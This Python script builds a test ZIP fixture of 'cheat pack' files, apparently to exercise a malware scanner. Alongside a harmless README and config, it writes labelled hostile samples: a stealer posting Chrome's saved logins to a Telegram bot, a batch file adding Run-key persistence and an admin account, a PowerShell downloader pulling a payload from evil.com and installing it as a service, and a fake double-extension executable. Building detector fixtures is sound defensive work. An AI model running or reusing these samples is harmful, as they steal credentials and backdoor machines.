"""Create a test ZIP archive with safe and dangerous files."""

import zipfile
import os

os.makedirs("tests/samples", exist_ok=True)

with zipfile.ZipFile("tests/samples/test_cheat.zip", "w") as zf:
    # Safe readme
    zf.writestr("README.txt", "This is a test cheat pack. For testing only.")

    # Safe config
    zf.writestr("config.json", '{"name": "test", "version": "1.0"}')

    # Suspicious Python stealer
    stealer_code = (
        "import os, subprocess, urllib.request, base64, requests\n"
        'chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")\n'
        'data = open(chrome, "rb").read()\n'
        "encoded = base64.b64encode(data)\n"
        'requests.post("https://api.telegram.org/bot123/sendDocument", files={"document": encoded})\n'
    )
    zf.writestr("loader.py", stealer_code)

    # Suspicious batch file
    batch_code = (
        "@echo off\r\n"
        'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "%~dp0loader.exe"\r\n'
        "net user hacker P@ssw0rd /add\r\n"
        "net localgroup Administrators hacker /add\r\n"
    )
    zf.writestr("install.bat", batch_code)

    # Suspicious PowerShell
    ps_code = (
        '$url = "http://evil.com/payload.exe"\n'
        'Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\\svchost.exe"\n'
        'Start-Process "$env:TEMP\\svchost.exe"\n'
        'New-Service -Name "WindowsUpdate" -BinaryPathName "$env:TEMP\\svchost.exe"\n'
    )
    zf.writestr("update.ps1", ps_code)

    # Double extension trick
    zf.writestr("photo.jpg.exe", b"MZ" + b"\x00" * 100)

print("Created tests/samples/test_cheat.zip with 6 files")
